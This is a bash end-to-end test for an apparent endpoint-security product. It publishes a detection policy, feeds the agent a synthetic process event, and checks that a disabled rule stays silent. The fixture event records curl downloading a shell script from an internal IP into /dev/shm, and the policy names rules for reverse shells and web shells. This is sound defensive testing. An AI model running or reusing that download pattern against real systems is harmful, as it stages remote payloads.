#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
RESULTS="$ROOT/test/.results"
BIN="$ROOT/bin"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/sysarmor-policy-endpoint-disable.XXXXXX")"
PORT_BASE="${PORT_BASE:-$((38000 + RANDOM % 2000))}"
MANAGER_PORT="${MANAGER_PORT:-$PORT_BASE}"
GRPC_PORT="${GRPC_PORT:-$((PORT_BASE + 1))}"
TOKEN="${SYSARMOR_DEV_TOKEN:-dev-token}"
MGR_URL="http://127.0.0.1:$MANAGER_PORT"
SCENARIO="policy-endpoint-disable"
AGENT_ID="policy-endpoint-agent"
HOST_ID="policy-endpoint-host"

mkdir -p "$RESULTS" "$BIN"

cleanup() {
  exec 3>&- 2>/dev/null || true
  if [[ -n "${AGENT_PID:-}" ]]; then kill "$AGENT_PID" 2>/dev/null || true; fi
  if [[ -n "${MGR_PID:-}" ]]; then kill "$MGR_PID" 2>/dev/null || true; fi
  rm -rf "$TMP"
}
trap cleanup EXIT

echo "[e2e-policy-endpoint-disable] building binaries"
make -C "$ROOT" build >/dev/null

"$BIN/sysarmor-manager" \
  --listen "127.0.0.1:$MANAGER_PORT" \
  --grpc-listen "127.0.0.1:$GRPC_PORT" \
  --store-backend memory \
  --dev-token "$TOKEN" \
  >"$TMP/manager.log" 2>&1 &
MGR_PID=$!

wait_contains() {
  local name="$1"
  local needle="$2"
  local out="$3"
  shift 3
  local deadline=$((SECONDS + 10))
  until "$@" >"$out" && grep -Fq "$needle" "$out"; do
    if (( SECONDS >= deadline )); then
      echo "[e2e-policy-endpoint-disable][ERROR] $name missing $needle" >&2
      cat "$out" >&2 2>/dev/null || true
      cat "$TMP/manager.log" >&2 2>/dev/null || true
      cat "$TMP/agent.log" >&2 2>/dev/null || true
      exit 1
    fi
    sleep 0.2
  done
}

wait_contains "healthz" '"ok":true' "$TMP/health.json" curl -sf "$MGR_URL/healthz"

cat > "$TMP/no-payload-policy.json" <<'JSON'
{
  "policy_id": "no-payload-drop",
  "version": 2,
  "tenant_id": "default",
  "endpoint_rules": [
    "web_runtime_spawns_shell",
    "download_by_lolbin",
    "reverse_shell_pattern",
    "suspicious_exec_connect"
  ],
  "cloud_rules": [
    "dropped_payload_executed_and_connects",
    "web_shell_chain"
  ],
  "mode": "observe",
  "converge": {
    "mode": "rarity_structural",
    "top_k": 8,
    "max_path_hops": 6,
    "cross_lineage": true
  },
  "published": true
}
JSON

curl -sf -X POST "$MGR_URL/api/v1/policies" \
  -H 'Content-Type: application/json' \
  --data-binary @"$TMP/no-payload-policy.json" > "$RESULTS/e2e-policy-endpoint-disable.policy.json"

cat > "$TMP/assignment.json" <<JSON
{
  "tenant_id": "default",
  "agent_id": "$AGENT_ID",
  "policy_id": "no-payload-drop",
  "policy_version": 2
}
JSON

curl -sf -X POST "$MGR_URL/api/v1/policy-assignments" \
  -H 'Content-Type: application/json' \
  --data-binary @"$TMP/assignment.json" > "$RESULTS/e2e-policy-endpoint-disable.assignment.json"

wait_contains "effective policy" '"policy_id":"no-payload-drop"' "$RESULTS/e2e-policy-endpoint-disable.effective.json" \
  "$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager policies effective --tenant-id default --agent-id "$AGENT_ID"

cat > "$TMP/collection.yaml" <<'POLICY'
{"behaviors":["file.write"],"observe_only":true}
POLICY

mkfifo "$TMP/events.pipe"

cat > "$TMP/agent.yaml" <<EOF
agent:
  id: $AGENT_ID
  host_id: $HOST_ID
  tenant_id: default
  token: $TOKEN
  scenario: $SCENARIO
manager:
  address: 127.0.0.1:$GRPC_PORT
  transport: grpc
sensor:
  backend: tetragon
  mode: managed
  version: test
  policy_path: $TMP/collection.yaml
  event_source: $TMP/events.pipe
  observe_only: true
spool:
  path: $TMP/spool
  max_bytes: 1048576
  batch_size: 10
  flush_interval: 1s
data_plane:
  retry_initial: 10ms
  retry_max: 20ms
  request_timeout: 2s
health:
  interval: 1s
EOF

"$BIN/sysarmor-agent" run --config "$TMP/agent.yaml" > "$TMP/agent.log" 2>&1 &
AGENT_PID=$!

exec 3>"$TMP/events.pipe"
printf '%s\n' '{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-16T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-16T09:59:59Z"}},"node_name":"node-a","time":"2026-06-16T10:00:00Z"}' >&3

wait_contains "agent assigned policy" 'policy=no-payload-drop version=2 mode=observe' "$RESULTS/e2e-policy-endpoint-disable.agent-start.txt" \
  grep -F 'policy=no-payload-drop version=2 mode=observe' "$TMP/agent.log"

wait_contains "uploaded event" "$SCENARIO" "$RESULTS/e2e-policy-endpoint-disable.events.json" \
  "$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager events list --scenario "$SCENARIO"

"$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager signals list --scenario "$SCENARIO" --layer endpoint > "$RESULTS/e2e-policy-endpoint-disable.signals.json"
if grep -Fq 'payload_dropped' "$RESULTS/e2e-policy-endpoint-disable.signals.json"; then
  echo "[e2e-policy-endpoint-disable][ERROR] disabled endpoint rule still emitted signal" >&2
  cat "$RESULTS/e2e-policy-endpoint-disable.signals.json" >&2
  exit 1
fi

wait_contains "agent health policy" '"policy_id":"no-payload-drop"' "$RESULTS/e2e-policy-endpoint-disable.health.json" \
  "$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager health get --tenant-id default --agent-id "$AGENT_ID"
if ! grep -Fq '"policy_version":2' "$RESULTS/e2e-policy-endpoint-disable.health.json"; then
  echo "[e2e-policy-endpoint-disable][ERROR] health missing assigned policy version" >&2
  cat "$RESULTS/e2e-policy-endpoint-disable.health.json" >&2
  exit 1
fi

cp "$TMP/agent.log" "$RESULTS/e2e-policy-endpoint-disable.agent.log"
cp "$TMP/manager.log" "$RESULTS/e2e-policy-endpoint-disable.manager.log"
echo "[e2e-policy-endpoint-disable] ok"
